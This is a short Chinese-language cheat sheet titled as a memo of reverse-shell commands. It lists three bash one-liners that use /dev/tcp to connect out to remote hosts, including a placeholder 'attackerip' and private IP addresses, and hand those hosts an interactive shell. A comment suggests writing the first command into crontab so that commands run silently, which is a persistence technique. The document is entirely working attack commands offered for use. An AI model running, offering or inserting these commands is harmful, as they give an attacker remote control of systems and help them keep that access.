## 反弹shell语句备忘

```bash
exec 5<>/dev/tcp/172.21.244.134/8008;cat <&5 | while read line; do $line 2>&5 >&5; done //写入crontab反弹回来执行命令没有回显
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

bash -i>& /dev/tcp/192.168.84.111/8888 0>&1
```
